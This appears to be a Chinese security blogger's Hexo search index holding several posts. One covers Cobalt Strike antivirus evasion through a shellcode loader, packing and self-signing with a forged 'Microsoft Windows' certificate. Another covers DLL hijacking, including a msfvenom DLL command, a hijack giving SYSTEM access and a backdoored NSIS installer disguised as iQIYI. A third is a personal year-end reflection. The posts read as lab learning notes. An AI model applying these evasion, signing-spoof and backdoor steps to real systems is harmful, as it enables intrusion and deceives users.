<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/07/CS%20%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/"/>
    <url>/2023/03/07/CS%20%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="CS-分离免杀上线"><a href="#CS-分离免杀上线" class="headerlink" title="CS 分离免杀上线"></a>CS 分离免杀上线</h1><p>首先cs上生成raw格式的木马，然后使用加载器加载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/knownsec/</span>shellcodeloader<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210827121258197.png" alt="image-20210827121258197"></p><p>火绒正常过，但是被360杀了</p><p><img src="/./../images/image-20210827121313495.png" alt="image-20210827121313495"></p><p><img src="/./../images/image-20210827121200670.png" alt="image-20210827121200670"></p><p>上线后的权限直接是system</p><p><img src="/./../images/image-20210827121438469.png" alt="image-20210827121438469"></p><p>下面尝试下加壳</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：http:<span class="hljs-regexp">//</span>www.pc6.com<span class="hljs-regexp">/softview/</span>SoftView_18439.html?_t_t_t=<span class="hljs-number">0.4545903904363513</span><br></code></pre></td></tr></table></figure><p>加壳后体积小了一点</p><p><img src="/./../images/image-20210827123119911.png" alt="image-20210827123119911"></p><p><img src="/./../images/image-20210827123152620.png" alt="image-20210827123152620"></p><p>再尝试添加下数字签名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">工具下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3gstudent/</span>signtools<br></code></pre></td></tr></table></figure><p>1.检查程序中是否有证书</p><p>管理员权限运行cmd</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cc">sigcheck.exe -q C:\Users\<span class="hljs-number">0</span>range\Desktop\loader.exe<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210827123732108.png" alt="image-20210827123732108"></p><p>2.使用makecert命令制作证书，sv-私钥文件名，ss-主题的证书存储名称，n-证书颁发对象，r-证书存储位置，输入私钥密码。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">makecert.<span class="hljs-keyword">exe</span> -n <span class="hljs-string">&quot;CN=Microsoft Windows&quot;</span> -r -<span class="hljs-keyword">sv</span> <span class="hljs-built_in">system</span>.pvk <span class="hljs-built_in">system</span>.cer<br>Cert2Spc.<span class="hljs-keyword">exe</span> <span class="hljs-built_in">system</span>.cer <span class="hljs-built_in">system</span>.spc<br>pvk2pfx.<span class="hljs-keyword">exe</span> -pvk <span class="hljs-built_in">system</span>.pvk -pi <span class="hljs-number">123456</span> -spc <span class="hljs-built_in">system</span>.spc -pfx <span class="hljs-built_in">system</span>.pfx -<span class="hljs-keyword">f</span><br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210827124017578.png" alt="image-20210827124017578"></p><p>3.注册证书与签发证书</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">CertMgr.Exe -<span class="hljs-built_in">add</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">system</span>.cer -s -r localmachine r<br>signtool.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">sign</span> /<span class="hljs-keyword">f</span> <span class="hljs-built_in">system</span>.pfx /<span class="hljs-keyword">p</span> <span class="hljs-number">123456</span>   C:\Users\<span class="hljs-number">0</span><span class="hljs-built_in">range</span>\Desktop\loader.<span class="hljs-keyword">exe</span> <br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210827124413983.png" alt="image-20210827124413983"></p><p><img src="/./../images/image-20210827124644428.png" alt="image-20210827124644428"></p><p>这里还是没有骗过360，只过掉了静态扫描</p><p><img src="/./../images/image-20210827125021156.png" alt="image-20210827125021156"></p><p><img src="/./../images/image-20210827124754787.png" alt="image-20210827124754787"></p><p>给powershell脚本上签名</p><p>生成证书文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">makecert -n <span class="hljs-string">&quot;CN=Microsoft Windows&quot;</span> -r -eku <span class="hljs-number">1.3</span>.<span class="hljs-number">6.1</span>.<span class="hljs-number">5.5</span>.<span class="hljs-number">7.3</span>.<span class="hljs-number">3</span> -sv certtest<span class="hljs-selector-class">.pvk</span> certtest<span class="hljs-selector-class">.cer</span><br>cert2spc certtest<span class="hljs-selector-class">.cer</span> certtest<span class="hljs-selector-class">.spc</span><br>pvk2pfx -pvk certtest<span class="hljs-selector-class">.pvk</span> -pi <span class="hljs-number">123456</span> -spc certtest<span class="hljs-selector-class">.spc</span> -pfx certtest<span class="hljs-selector-class">.pfx</span> -f<br></code></pre></td></tr></table></figure><p>给脚本签名</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">powershell<br><span class="hljs-meta"><span class="hljs-keyword">$cert</span> = Get-PfxCertificate certtest.pfx</span><br><span class="hljs-keyword">Set</span>-AuthenticodeSignature <span class="hljs-comment">-Filepath C:\Users\0range\Desktop\payload.ps1 -Cert $cert</span><br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210827130322716.png" alt="image-20210827130322716"></p><p>这火绒都杀。。。</p><p><img src="/./../images/image-20210827130229931.png" alt="image-20210827130229931"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>毕竟工具放出来这么长时间了，而且不需要什么技术含量，纯粹傻瓜式操作，免杀效果可见一斑，但不妨稍加改造，自己造轮子（太菜了，我不会。。。），效果应该会更好。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考链接：<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LyShark/</span>p/<span class="hljs-number">11347609</span>.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>#回首2022：也无风雨也无晴</title>
    <link href="/2022/12/31/%E5%9B%9E%E9%A6%962022%EF%BC%9A%E4%B9%9F%E6%97%A0%E9%A3%8E%E9%9B%A8%E4%B9%9F%E6%97%A0%E6%99%B4/"/>
    <url>/2022/12/31/%E5%9B%9E%E9%A6%962022%EF%BC%9A%E4%B9%9F%E6%97%A0%E9%A3%8E%E9%9B%A8%E4%B9%9F%E6%97%A0%E6%99%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="回首2022：也无风雨也无晴"><a href="#回首2022：也无风雨也无晴" class="headerlink" title="回首2022：也无风雨也无晴"></a>回首2022：也无风雨也无晴</h1><p>从去年写了年度总结开始，就觉得每一年对自己进行一个反思和思考很有意义。但今年是流水账，想到哪写哪吧哈哈哈哈。</p><p>回顾一整年，自身原因加上环境原因，使得<strong>焦虑</strong>作为主旋律贯穿始终，但是更多的还是<strong>幸运</strong>加持。</p><p>还是先列举一下今年的月份纪（印象深刻的月份发生的事情）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">一月：开始学习<br>六月：面试、实习<br>七月：工作、认识朋友<br>八月：学技术、做一些疯狂的事<br>九月：回学校学习<br>十二月：旅游<br></code></pre></td></tr></table></figure><p>写这篇的时候已经过完年了（emmm我拖延了。。。），最开始确定这一年的基调的时候，总感觉过的很焦虑很匆忙，其实，现在回过头看看，这一年这一年的暑假应该算是成年后的我在自己决定下过的最刺激的一年了。</p><p>从哪里开始写起呢？</p><p>是从开头一二月份不分昼夜的学习，每天做梦脑袋里面都是是安全安全开始呢？</p><p>还是从三四月开始投简历，从磕磕巴巴跟面试官说话到和面试官谈笑风生开始呢？</p><p>亦或是从六七月入职实习，学习实战经验，认识大牛前辈，在大牛前辈面前分享自己的产出开始呢？</p><p>更甚是从八九月份认识同事，一起做些年轻的疯狂的事儿，一起疯狂熬夜通宵，一起加班完成项目开始呢？</p><p>还是从回归学校后，度过疫情最严重的时候，并在突然大环境放开的情况下，一边在外面跑毒一边在外面旅游开始呢？</p><p>·············</p><p>好像没办法开始，我总觉得文字无法用来概括我的2022年，不论什么文字，都很苍白无力，都无法写出当时当下的心情。想用我匮乏的语言形容一下，但是删删又改改，还是找不到合适的词语，那种心情是独一无二的，是无与伦比的。</p><p>概括一下我在2022年的收获，我想大概是下面这样：</p><ul><li>在焦虑中思考与成长</li><li>在幸运中自由与恣意</li></ul><p>这一年的焦略作为主旋律，一直在我脑海里，时时刻刻绷着我。</p><p>在开始入门学习安全的时候，会怕自己付出没有回报，会焦虑；在投简历的时候，害怕自己简历太空白，会焦虑；在面试的时候，社恐，加上害怕技术面，会焦虑；在入职的时候，第一次进入社会，会焦虑；在做技术分享的时候，害怕技术在实习生中垫底，会焦虑；在完成项目的时候，害怕完成的不尽人意，会焦虑；在下班回去的时候，只有自已一个人在陌生的城市的时候，会焦虑·······</p><p>但现在回首向来”焦虑“处，也无风雨也无晴。以现在的心态回看这一年的焦虑，就是<strong>嘎嘎干！</strong>干就完事了。毕竟，<strong>接受一切的可能，允许一切的发生</strong>，不是嘛？</p><p>这一年的更多的是幸运。其实，幸运都很显而易见了，上面的所有所有的焦虑都在幸运的加持下灰飞烟灭，在幸运的帮助下，完成了自我鞭策和进步。当然了，最最最幸运的是认识几位学长学姐，在她们的帮助下，在工作上完成超额工作，在生活上适应一个人的生活和陌生的工作的环境（她们的帮助不止这个，对我来说，是可以单独写一篇满满当当文章都说不尽的程度）。并且，到现在为止，也一直有着联系，也会见面，也会一起出去玩。</p><p>好了，借用一句话，总结一下吧。</p><p>尽管曲径辗转的生活每个瞬间都未知，但回看这一年，轻舟已过万重山，过山过桥过遗憾。</p><p><strong>仅用以上1160个字致敬我这丰富多彩的2022年。</strong></p><hr><p><em>永远热血赴山海</em></p>]]></content>
    
    
    <categories>
      
      <category>总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>年度总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#Dll劫持初体验</title>
    <link href="/2022/12/10/Dll%E5%8A%AB%E6%8C%81%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2022/12/10/Dll%E5%8A%AB%E6%8C%81%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="Dll劫持初体验"><a href="#Dll劫持初体验" class="headerlink" title="Dll劫持初体验"></a>Dll劫持初体验</h3><p>DLL：动态链接库。DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。dll文件和exe文件一样都是PE文件。</p><h4 id="为什么可以dll劫持"><a href="#为什么可以dll劫持" class="headerlink" title="为什么可以dll劫持"></a>为什么可以dll劫持</h4><p>主要是因为Windows的资源共享机制。为了尽可能多得安排资源共享，微软建议多个应用程序共享的任何模块应该放在Windows的系统目录中，如kernel32.dll，这样能够方便找到。但是随着时间的推移，安装程序会用旧文件或者未向后兼容的新文件来替换系统目录下的文件，这样会使一些其他的应用程序无法正确执行，因此，微软改变了策略，建议应用程序将所有文件放到自己的目录中去，而不要去碰系统目录下的任何东西。</p><p>为了提供这样的功能，在Window2000开始，微软加了一个特性，强制操作系统的加载程序首先从应用程序目录中加载模块，只有当加载程序无法在应用程序目录中找到文件，才搜索其他目录。利用系统的这个特性，就可以使应用程序强制加载我们指定的DLL做一些特殊的工作。</p><h4 id="什么是dll劫持"><a href="#什么是dll劫持" class="headerlink" title="什么是dll劫持"></a>什么是dll劫持</h4><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，进而持久化控制。</p><p>由于 输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在 Windows系统目录中查找，最后是在 环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的 输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.进程装载DLL。<br>2.进程卸载DLL。<br>3.DLL在被装载之后创建新线程。<br>4.DLL在被装载之后线程被终止。<br></code></pre></td></tr></table></figure><h5 id="dll文件的加载顺序"><a href="#dll文件的加载顺序" class="headerlink" title="dll文件的加载顺序"></a>dll文件的加载顺序</h5><p>一、Windows XP SP2之前 Windows查找DLL的目录以及对应的顺序：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 进程对应的应用程序所在目录；<br><span class="hljs-bullet">2.</span> 当前目录（Current Directory）；<br><span class="hljs-bullet">3.</span> 系统目录（通过 GetSystemDirectory 获取）；<br><span class="hljs-bullet">4.</span> 16位系统目录；<br><span class="hljs-bullet">5.</span> Windows目录（通过 GetWindowsDirectory 获取）；<br><span class="hljs-bullet">6.</span> PATH环境变量中的各个目录；<br></code></pre></td></tr></table></figure><p>例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p><p>二、在Windows xp sp2之后</p><p>Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p><p>默认注册表为：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode， //其键值为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>dll文件加载顺序：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；<br><span class="hljs-bullet">2.</span> 系统目录（即%windir%system32）；<br><span class="hljs-bullet">3.</span> 16位系统目录（即%windir%system）；<br><span class="hljs-bullet">4.</span> Windows目录（即%windir%）；<br><span class="hljs-bullet">5.</span> 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；<br><span class="hljs-bullet">6.</span> PATH环境变量中的各个目录；<br></code></pre></td></tr></table></figure><p>三、Windows7以上</p><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\KnownDLLs<br></code></pre></td></tr></table></figure><p>根据dll文件的路径，去注册表里面找。</p><p>但是不管是哪种情况，第一个搜索的肯定是应用程序的所在目录，这样就有机会让应用程序去加载我们的DLL。如果这个DLL和系统目录下的某个DLL同名，导出表也相同，功能就是加载系统目录下的那个DLL，并且将导出表转发到那个真实的DLL。这时DLL劫持就发生了。可以看出，构造一个符合上面要求的DLL，再将其放在可执行文件的目录即可轻松实现DLL劫持了。</p><h5 id="dll劫持产生条件"><a href="#dll劫持产生条件" class="headerlink" title="dll劫持产生条件"></a>dll劫持产生条件</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.dll能否被劫持：<br>  不在&#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&#x27;注册表中<br><span class="hljs-number">2</span>.其dll是EXE程序首先加载的DLL，而不是依赖其他DLL加载的。<br><span class="hljs-number">3</span>.DLL确实被加载进内存中<br></code></pre></td></tr></table></figure><h4 id="判断dll是否可以被劫持的判断方法"><a href="#判断dll是否可以被劫持的判断方法" class="headerlink" title="判断dll是否可以被劫持的判断方法"></a>判断dll是否可以被劫持的判断方法</h4><p>查看dll是否存在于“KnownDlls”中</p><h5 id="手动方法"><a href="#手动方法" class="headerlink" title="手动方法"></a>手动方法</h5><p>把程序单独放到一个文件夹中，这种报错的话，就emm</p><p><img src="/./../images/image-20210827152057081.png" alt="image-20210827152057081"></p><p><img src="/./../images/image-20210825112743456.png" alt="image-20210825112743456"></p><h6 id="ProcessExplorer"><a href="#ProcessExplorer" class="headerlink" title="ProcessExplorer"></a>ProcessExplorer</h6><p>给出官方下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>sysinternals<span class="hljs-regexp">/downloads/</span>process-explorer<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210824181448899.png" alt="image-20210824181448899"></p><h6 id="ProcessMonitor"><a href="#ProcessMonitor" class="headerlink" title="ProcessMonitor"></a>ProcessMonitor</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>sysinternals<span class="hljs-regexp">/downloads/</span>procmon<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20210824182536576.png" alt="image-20210824182536576"></p><p><img src="/./../images/image-20210824182600639.png" alt="image-20210824182600639"></p><h6 id="火绒剑"><a href="#火绒剑" class="headerlink" title="火绒剑"></a>火绒剑</h6><p><img src="/./../images/image-20210824183043282.png" alt="image-20210824183043282"></p><p>到这里来对比</p><p><img src="/./../images/image-20210824183603094.png" alt="image-20210824183603094"></p><h4 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h4><h6 id="1-Ratter"><a href="#1-Ratter" class="headerlink" title="1.Ratter"></a>1.Ratter</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sensepost/</span>rattler/releases<br></code></pre></td></tr></table></figure><p>应该是我加载文件的原因，没找到一个可以利用dll劫持的，现在的防护也做得比较好</p><p><img src="/./../images/image-20210824183840069.png" alt="image-20210824183840069"></p><h6 id="2-DLL-Hijack-Auditor"><a href="#2-DLL-Hijack-Auditor" class="headerlink" title="2.DLL Hijack Auditor"></a>2.DLL Hijack Auditor</h6><p>自行百度下载</p><p><img src="/./../images/image-20210824185509618.png" alt="image-20210824185509618"></p><h6 id="3-ChkDllHijack"><a href="#3-ChkDllHijack" class="headerlink" title="3.ChkDllHijack"></a>3.ChkDllHijack</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载链接：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/anhkgg/</span>anhkgg-tools<br></code></pre></td></tr></table></figure><p>待验证的dll列表可以用前面提到的微软自带的工具导出到txt文档，直接复制就可以。</p><p><img src="/./../images/image-20210824212227637.png" alt="image-20210824212227637"></p><p><img src="/./../images/image-20210824212923879.png" alt="image-20210824212923879"></p><h4 id="实现dll劫持"><a href="#实现dll劫持" class="headerlink" title="实现dll劫持"></a>实现dll劫持</h4><p>这里在我的虚拟机中测试</p><p>我比较菜，现在还不会动手写dll文件，这里就使用工具来生成dll文件。</p><p>首先明确我们的需求：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、构造一个与系统目录下LPK.DLL一样的导出表<br><span class="hljs-number">2</span>、加载系统目录下的LPK<span class="hljs-selector-class">.DLL</span><br><span class="hljs-number">3</span>、将导出函数转发到系统目录下的LPK.DLL上<br><span class="hljs-number">4</span>、在初始化函数中加入我们要执行的代码<br></code></pre></td></tr></table></figure><p>这里使用t00ls的lpk提权辅助</p><p>设置触发dll劫持的热键。</p><p><img src="/./../images/image-20210824221349524.png" alt="image-20210824221349524"></p><p>放到exe程序的相同目录里，只要对方重启该exe程序，dll文件就会被触发，我这里放到了phpstudy目录里。</p><p><img src="/./../images/image-20210824221526476.png" alt="image-20210824221526476"></p><p>如果没有第三方软件的话，也可以放到IIS  mysql数据库里。</p><p><img src="/./../images/image-20210824221640569.png" alt="image-20210824221640569"></p><p>远程连接输入热键和密码，成功实现劫持。</p><p><img src="/./../images/image-20210824221658645.png" alt="image-20210824221658645"></p><p>开始漫游</p><p><img src="/./../images/image-20210824221749933.png" alt="image-20210824221749933"></p><p>看下当前权限，system</p><p><img src="/./../images/image-20210824221824565.png" alt="image-20210824221824565"></p><p>这里我只是实现了第三方软件的dll劫持，还可以劫持系统的dll，手法多种多样，下面介绍几种其他的方式生成dll文件。</p><h6 id="1-msf生成"><a href="#1-msf生成" class="headerlink" title="1.msf生成"></a>1.msf生成</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">msfvenom -p windows/exec CMD <span class="hljs-operator">=</span> notepad.exe EXITFUNC<span class="hljs-operator">=</span>thread -f dll -o notepad.dll<br></code></pre></td></tr></table></figure><p>这种方法显而易见，不免杀，而且免杀很难做。</p><h6 id="2-InjectProc注入"><a href="#2-InjectProc注入" class="headerlink" title="2.InjectProc注入"></a>2.InjectProc注入</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/secrary/</span>InjectProc<span class="hljs-regexp">/releases/</span>tag/<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>这个工具利用的是进程注入，链接中也有演示视频，这里就不演示了。</p><h6 id="3-CS-注入工具"><a href="#3-CS-注入工具" class="headerlink" title="3.CS + 注入工具"></a>3.CS + 注入工具</h6><p>先生成一段shellcode，再利用工具注入</p><p><img src="/./../images/image-20210824222615284.png" alt="image-20210824222615284"></p><p>ring3层的dll注入</p><p><img src="/./../images/image-20210824222825384.png" alt="image-20210824222825384"></p><p>这个</p><p><img src="/./../images/image-20210825115627052.png" alt="image-20210825115627052"></p><p>会在当前目录下生成conf.inf 和 wwwcomw.dll 两个文件，体积也不太大。</p><p><img src="/./../images/image-20210824222958239.png" alt="image-20210824222958239"></p><p>然后需要将dll文件放到和准备劫持的exe同一目录中。这里我都放到了桌面。</p><p><img src="/./../images/image-20210824225307315.png" alt="image-20210824225307315"></p><p>首先将shellcode生成的dll函数导入到exe pe表中</p><p>将准备劫持的文件放到pe查看器中</p><p><img src="/./../images/image-20210824224705341.png" alt="image-20210824224705341"></p><p>在函数那里导入刚才生成的dll函数</p><p><img src="/./../images/image-20210824224850213.png" alt="image-20210824224850213"></p><p><img src="/./../images/image-20210824225139414.png" alt="image-20210824225139414"></p><p>但是我这里确始终不上线，不知道是系统原因还是劫持文件的原因，换了好几个exe文件都不得行。有知道的师傅可以告诉我一下。</p><h6 id="4-利用NSIS默认向导脚本制作Windows安装包"><a href="#4-利用NSIS默认向导脚本制作Windows安装包" class="headerlink" title="4.利用NSIS默认向导脚本制作Windows安装包"></a>4.利用NSIS默认向导脚本制作Windows安装包</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"> 下载地址：https:<span class="hljs-regexp">//</span>nsis.sourceforge.io/Download<br></code></pre></td></tr></table></figure><p>NSIS只是一个打包安装包的软件，想要打包后上线的前提是第三步中的exe已经被注入可以上线。</p><p>准备一个exe文件（这里应该是第三步中注入好的exe文件，因为我第三步中选的exe没有图标，所以这里换一个exe）</p><p><img src="/./../images/image-20210824231519652.png" alt="image-20210824231519652"></p><p>利用资源树提取ico图标</p><p><img src="/./../images/image-20210824232531410.png" alt="image-20210824232531410"></p><p>准备打包</p><p>选择编译脚本</p><p><img src="/./../images/image-20210824232116074.png" alt="image-20210824232116074"></p><p>开始安装</p><p><img src="/./../images/image-20210824232157170.png" alt="image-20210824232157170"></p><p><img src="/./../images/image-20210824232819179.png" alt="image-20210824232819179"></p><p><img src="/./../images/image-20210824233001057.png" alt="image-20210824233001057"></p><p>应用程序默认安装目录最好，为了防止和原来安装的冲突，应用名后面加个1</p><p>还有下面的授权文件，路径必须存在 ，不然后面编译时会报错。(呜呜呜  这里浪费了太多时间)</p><p><img src="/./../images/image-20210824233058500.png" alt="image-20210824233058500"></p><p>第五步先把默认的两个项目删掉，然后新建项目</p><p><img src="/./../images/image-20210825121454652.png" alt="image-20210825121454652"></p><p><img src="/./../images/image-20210825121539770.png" alt="image-20210825121539770"></p><p><img src="/./../images/image-20210824233444394.png" alt="image-20210824233444394"></p><p><img src="/./../images/image-20210824233546370.png" alt="image-20210824233546370"></p><p><img src="/./../images/image-20210824233611594.png" alt="image-20210824233611594"></p><p>emmm 干得漂亮</p><p>换个安装包试试</p><p><img src="/./../images/image-20210824233807228.png" alt="image-20210824233807228"></p><p>换了个爱奇艺，成功编译</p><p><img src="/./../images/image-20210825124823438.png" alt="image-20210825124823438"></p><p><img src="/./../images/image-20210825124945535.png" alt="image-20210825124945535"></p><p><img src="/./../images/image-20210825125118358.png" alt="image-20210825125118358"></p><p><img src="/./../images/image-20210825124852589.png" alt="image-20210825124852589"></p><p>对比一下可以看到 体积只增加了一点点  少了数字签名  一般人的话应该不会不会注意到，这个时候配合注入dll 可以成功实现留后门。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>dll可以利用的点很多，思路很多很广，可以劫持，注入，提权，白加黑、自己编写dll加载shellcode等等。</p><p>有哪里不对的大佬们可以指出来</p><p>参考链接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">11031238</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/gamma_lab/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119451934</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">339329861</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#Bypass UAC之初体验</title>
    <link href="/2022/12/05/Bypass-UAC%E4%B9%8B%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2022/12/05/Bypass-UAC%E4%B9%8B%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
